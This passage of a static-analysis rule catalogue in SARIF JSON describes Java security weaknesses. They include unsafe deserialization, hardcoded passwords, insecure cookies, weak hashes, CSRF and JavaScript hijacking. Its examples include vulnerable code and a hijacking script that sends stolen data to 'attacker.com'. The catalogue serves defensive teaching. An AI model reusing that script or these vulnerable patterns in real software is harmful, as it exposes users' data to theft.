                "text": "Java serialization turns object graphs into byte streams that contain the objects themselves and the necessary metadata to reconstruct them from the byte stream. Developers can create custom code to aid in the process of deserializing Java objects, where they can replace the deserialized objects with different objects, or proxies. The customized deserialization process takes place during objects reconstruction, before the objects are returned to the application and cast into expected types. By the time developers try to enforce an expected type, code may have already been executed. \r\n\r\nCustom deserialization routines are defined in the serializable classes which need to be present in the runtime classpath and cannot be injected by the attacker so the exploitability of these attacks depends on the classes available in the application environment. Unfortunately, common third party classes or even JDK classes can be abused to exhaust JVM resources, deploy malicious files, or run arbitrary code.\r\r\n\r\nIn this case a call to {PrimaryCall.name} happens at {PrimaryLocation.file} line {PrimaryLocation.line}.\r\r\n\r\n**Example 1:** An application deserializing untrusted object streams can lead to application compromise.\n`\nInputStream is = request.getInputStream();\nObjectInputStream ois = new ObjectInputStream(is);\nMyObject obj = (MyObject) ois.readObject();\n`"
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "5.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "502",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Probability": "2",
                "Accuracy": "4.0",
                "Impact": "5.0"
              }
            },
            {
              "id": "15EDD3AB-0EDB-4095-A0FD-B79BC549B5CC",
              "guid": "15EDD3AB-0EDB-4095-A0FD-B79BC549B5CC",
              "name": "Encapsulation/System Information Leak/Spring Boot Actuators Enabled",
              "shortDescription": {
                "text": "Enabling Spring Boot Actuators may reveal system data and debugging information which may help an adversary learn about the system and form a plan of attack."
              },
              "fullDescription": {
                "text": "Spring Boot Actuators allow users to monitor and interact with the application. There are different built-in Actuators which expose system data and debugging information through HTTP endpoints, JMX or even by remote shell (SSH or Telnet). Attackers may benefit from this information to learn about the system and gather information that could be used to attack the application."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "497",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "29C589A2-3796-4486-A12D-BCE05ADFFE11",
              "guid": "29C589A2-3796-4486-A12D-BCE05ADFFE11",
              "name": "Environment/Password Management/Password in Configuration File",
              "shortDescription": {
                "text": "Storing a plaintext password in a configuration file may result in a system compromise."
              },
              "fullDescription": {
                "text": "Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plaintext.\r\n\r\nIn this case, a hardcoded password exists in {PrimaryLocation.file} at line {PrimaryLocation.line}."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "13",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "260",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "555",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "ED57A0C1-5039-43E7-B753-28128F786E8B",
              "guid": "ED57A0C1-5039-43E7-B753-28128F786E8B",
              "name": "API Abuse/Unchecked Return Value",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} ignores the value returned by {PrimaryCall.name} on line {PrimaryLocation.line}, which could cause the program to overlook unexpected states and conditions.\r\nIgnoring a method's return value can cause the program to overlook unexpected states and conditions."
              },
              "fullDescription": {
                "text": "It is not uncommon for Java programmers to misunderstand `read()` and related methods that are part of many `java.io` classes. Most errors and unusual events in Java result in an exception being thrown. (This is one of the advantages that Java has over languages like C: Exceptions make it easier for programmers to think about what can go wrong.) But the stream and reader classes do not consider it unusual or exceptional if only a small amount of data becomes available. These classes simply add the small amount of data to the return buffer, and set the return value to the number of bytes or characters read. There is no guarantee that the amount of data returned is equal to the amount of data requested.\r\n\r\nThis behavior makes it important for programmers to examine the return value from `read()` and other IO methods to ensure that they receive the amount of data they expect.\r\n\r\nIn this case the value of <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> is unchecked in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example:** The following code loops through a set of users, reading a private data file for each user. The programmer assumes that the files are always exactly 1 kilobyte in size and therefore ignores the return value from `read()`. If an attacker can create a smaller file, the program will recycle the remainder of the data from the previous user and handle it as though it belongs to the attacker.\r\n\r\n`\nFileInputStream fis;\nbyte[] byteArray = new byte[1024];\nfor (Iterator i=users.iterator(); i.hasNext();) {\n    String userName = (String) i.next();\n    String pFileName = PFILE_ROOT + \"/\" + userName;\n    FileInputStream fis = new FileInputStream(pFileName);\n    fis.read(byteArray); // the file is always 1k bytes\n    fis.close();\n    processPFile(userName, byteArray);\n}\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "252",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "754",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "AC87E716-8766-4F78-8851-86354C03A13B",
              "guid": "AC87E716-8766-4F78-8851-86354C03A13B",
              "name": "Security Features/Cookie Security/Cookie not Sent Over SSL",
              "shortDescription": {
                "text": "A cookie is created without the `secure` flag set to `true`."
              },
              "fullDescription": {
                "text": "Modern web browsers support a `secure` flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\r\n\r\nIn this case a cookie is created in {FirstTraceLocation.file} at line {FirstTraceLocation.line}, but `setSecure()` is not called or is called with the value `false`.\r\n\r\n**Example 1:** In the example below, a cookie added to the response without setting the `secure` flag.\n`\n\tCookie cookie = new Cookie(\"emailCookie\", email);\n\tresponse.addCookie(cookie);\n`\r\n\r\nIf your application uses both HTTPS and HTTP but does not set the `secure` flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Sniffing network traffic over unencrypted wireless connections is a trivial task for attackers, so sending cookies (especially those with session IDs) over HTTP can result in application compromise."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "614",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "4280F38B-9FDB-454E-B495-89CF45CD51B7",
              "guid": "4280F38B-9FDB-454E-B495-89CF45CD51B7",
              "name": "API Abuse/Missing Check against Null",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} can dereference a null pointer on line {LastTraceLocation.line} because it does not check the return value of {PrimaryCall.name}, which might return null.\r\nThe program can dereference a null pointer because it does not check the return value of a function that might return null."
              },
              "fullDescription": {
                "text": "Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.\r\n\r\nTwo dubious assumptions that are easy to spot in code are \"this function call can never fail\" and \"it doesn't matter if this function call fails\". When a programmer ignores the return value from a function, they implicitly state that they are operating under one of these assumptions.\r\n\r\nIn this case, an earlier return value is used without being checked in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:**  The following code does not check to see if the string returned by `getParameter()` is `null` before calling the member function `compareTo()`, potentially causing a null dereference.\r\n\r\n`\nString itemName = request.getParameter(ITEM_NAME);\n\tif (itemName.compareTo(IMPORTANT_ITEM)) {\n\t\t...\n\t}\n\t...\n`\r\n\r\n**Example 2:**. The following code shows a system property that is set to `null` and later dereferenced by a programmer who mistakenly assumes it will always be defined.\r\n\r\n`\nSystem.clearProperty(\"os.name\");\n...\nString os = System.getProperty(\"os.name\");\nif (os.equalsIgnoreCase(\"Windows 95\") )\n\tSystem.out.println(\"Not supported\");\n`\r\n\r\nThe traditional defense of this coding error is:\r\n\r\n\"I know the requested value will always exist because.... If it does not exist, the program cannot perform the desired behavior so it doesn't matter whether I handle the error or simply allow the program to die dereferencing a null value.\"\r\n\r\nBut attackers are skilled at finding unexpected paths through programs, particularly when exceptions are involved."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "253",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "690",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "2254C8BD-DABE-41CB-9D12-CAC442B24079",
              "guid": "2254C8BD-DABE-41CB-9D12-CAC442B24079",
              "name": "Security Features/Weak Cryptographic Hash",
              "shortDescription": {
                "text": "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts."
              },
              "fullDescription": {
                "text": "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\r\n\r\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "328",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "3.5"
              }
            },
            {
              "id": "D95A106D-5C95-433B-96C3-76E69BBF5C38",
              "guid": "D95A106D-5C95-433B-96C3-76E69BBF5C38",
              "name": "Encapsulation/JavaScript Hijacking",
              "shortDescription": {
                "text": "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application."
              },
              "fullDescription": {
                "text": "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\r\n\r\nWeb browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\r\n\r\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\r\n\r\n**Example 1:** The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\r\n\r\nThe client requests data from a server and evaluates the result as JSON with the following code:\n`\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n`\r\n\r\nWhen the code runs, it generates an HTTP request that looks like this:\r\n\r\n`\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n`\r\n\r\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\r\n\r\n`\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n`\r\n\r\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\r\n\r\n`\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\r\n\r\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\r\n\r\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n`\r\n\r\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\r\n\r\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\r\n\r\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "9DC93E75-BA94-4FA1-A177-ED1201EB29BC",
              "guid": "9DC93E75-BA94-4FA1-A177-ED1201EB29BC",
              "name": "Security Features/Password Management/Password in Comment",
              "shortDescription": {
                "text": "Storing passwords or password details in plaintext anywhere in the system or system code may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Storing password details within comments is equivalent to hardcoding passwords. Not only does it allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password is now leaked to the outside world and cannot be protected or changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case the password details appear in the comment in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example:** The following comment specifies the default password to connect to a database:\r\n\r\n`\n...\n// Default username for database connection is \"scott\"\n// Default password for database connection is \"tiger\"\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "615",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "3.0"
              }
            },
            {
              "id": "C5FBCC67-8AAF-4ED2-B91E-E47B3FDDC0AE",
              "guid": "C5FBCC67-8AAF-4ED2-B91E-E47B3FDDC0AE",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case a hardcoded password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded password to connect to a database:\r\n\r\n`\n...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the `javap -c` command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:\r\n\r\n`\njavap -c ConnMngr.class\r\n\r\n22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc   #38; //String scott\n26: ldc   #17; //String tiger\n`\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 2:** The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    handler.proceed(\"guest\", \"allow\");\n  }\n});\n...\n`\r\n\r\nSimilar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "2335EF74-F5C5-4BE1-89B6-707D1B78D6B3",
              "guid": "2335EF74-F5C5-4BE1-89B6-707D1B78D6B3",
              "name": "Encapsulation/Cross-Site Request Forgery",
              "shortDescription": {
                "text": "The HTTP request at {PrimaryLocation.file} line {PrimaryLocation.line} must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.\r\nHTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests."
              },
              "fullDescription": {
                "text": "A cross-site request forgery (CSRF) vulnerability occurs when:\n1. A web application uses session cookies.\r\n\r\n2. The application acts on an HTTP request without verifying that the request was made with the user's consent.\r\n\r\nIn this case the application generates an HTTP request at {PrimaryLocation.file} line {PrimaryLocation.line}.\r\n\r\nA nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a web application that allows administrators to create new accounts as follows:\r\n\r\n`\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"/new_user\", true);\n  body = addToPost(body, new_username);\n  body = addToPost(body, new_passwd);\n  req.send(body);\n`\r\n\r\nAn attacker might set up a malicious web site that contains the following code.\r\n\r\n`\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"http://www.example.com/new_user\", true);\n  body = addToPost(body, \"attacker\");\n  body = addToPost(body, \"haha\");\n  req.send(body);\n`\r\n\r\nIf an administrator for `example.com` visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application.\r\n\r\nApplications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request.\nCSRF is entry number five on the 2007 OWASP Top 10 list."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "352",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "572EA1F6-FC86-443E-B1A9-A227D5AD17CC",
              "guid": "572EA1F6-FC86-443E-B1A9-A227D5AD17CC",
              "name": "Errors/Poor Error Handling/Overly Broad Throws",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} throws a generic exception making it harder for callers to do a good job of error handling and recovery.\r\nThe method throws a generic exception making it harder for callers to do a good job of error handling and recovery."
              },
              "fullDescription": {
                "text": "Declaring a method to throw `Exception` or `Throwable` makes it difficult for callers to do good error handling and error recovery. Java's exception mechanism is set up to make it easy for callers to anticipate what can go wrong and write code to handle each specific exceptional circumstance. Declaring that a method throws a generic form of exception defeats this system.\r\n\r\n**Example:** The following method throws three types of exceptions.\r\n\r\n`\npublic void doExchange()\n  throws IOException, InvocationTargetException,\n         SQLException {\n  ...\n}\r\n\r\n`\r\n\r\nWhile it might seem tidier to write\r\n\r\n`\npublic void doExchange()\n  throws Exception {\n  ...\n}\n`\r\n\r\ndoing so hampers the caller's ability to understand and handle the exceptions that occur. Further, if a later revision of `doExchange()` introduces a new type of exception that should be treated differently than previous exceptions, there is no easy way to enforce this requirement."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "397",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "8303786C-2D44-445D-857D-1C929841AECC",
              "guid": "8303786C-2D44-445D-857D-1C929841AECC",
              "name": "API Abuse/Code Correctness/Class Does Not Implement equals",
              "shortDescription": {
                "text": "The `equals()` method is called on an object that does not implement `equals()`."
              },
              "fullDescription": {
                "text": "When comparing objects, developers usually want to compare properties of objects. However, calling `equals()` on a class (or any super class/interface) that does not explicitly implement `equals()` results in a call to the `equals()` method inherited from `java.lang.Object`. Instead of comparing object member fields or other properties, `Object.equals()` compares two object instances to see if they are the same. Although there are legitimate uses of `Object.equals()`, it is often an indication of buggy code.\r\n\r\n**Example 1:**\n`\npublic class AccountGroup\n{\n\tprivate int gid;\r\n\r\n\tpublic int getGid()\n\t{\n\t\treturn gid;\n\t}\r\n\r\n\tpublic void setGid(int newGid)\n\t{\n\t\tgid = newGid;\n\t}\n}\n...\npublic class CompareGroup\n{\n\tpublic boolean compareGroups(AccountGroup group1, AccountGroup group2)\n\t{\n\t\treturn group1.equals(group2);   //equals() is not implemented in AccountGroup\n\t}\n}\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "398",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "74714BFC-EDF7-445B-8672-0996214D5845",
              "guid": "74714BFC-EDF7-445B-8672-0996214D5845",
              "name": "Code Quality/Unreleased Resource/Streams",
              "shortDescription": {
                "text": "The function {EnclosingFunction.name} in {PrimaryLocation.file} sometimes fails to release a system resource allocated by {FirstTransitionFunction} on line {FirstTraceLocation.line}.\r\nThe program can potentially fail to release a system resource."
              },
              "fullDescription": {
                "text": "The program can potentially fail to release a system resource.\r\n\r\nIn this case, there are program paths on which the resource allocated in {FirstTraceLocation.file} at line {FirstTraceLocation.line} is not released.\r\n\r\nResource leaks have at least two common causes:\r\n\r\n- Error conditions and other exceptional circumstances.\r\n\r\n- Confusion over which part of the program is responsible for releasing the resource.\r\n\r\nMost unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.\r\n\r\n**Example:** The following method never closes the file handle it opens. The `finalize()` method for `FileInputStream` eventually calls `close()`, but there is no guarantee as to how long it will take before the `finalize()` method will be invoked. In a busy environment, this can result in the JVM using up all of its file handles.\n`\nprivate void processFile(String fName) throws FileNotFoundException, IOException {\n  FileInputStream fis = new FileInputStream(fName);\n  int sz;\n  byte[] byteArray = new byte[BLOCK_SIZE];\n  while ((sz = fis.read(byteArray)) != -1) {\n    processBytes(byteArray, sz);\n  }\n}\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "404",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.5",
                "Probability": "1.0"
              }
            },
            {
              "id": "A9DC3C82-BE55-43F3-935E-DCF1329BB954",
              "guid": "A9DC3C82-BE55-43F3-935E-DCF1329BB954",
              "name": "Encapsulation/JavaScript Hijacking/Vulnerable Framework",
              "shortDescription": {
                "text": "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application."
              },
              "fullDescription": {
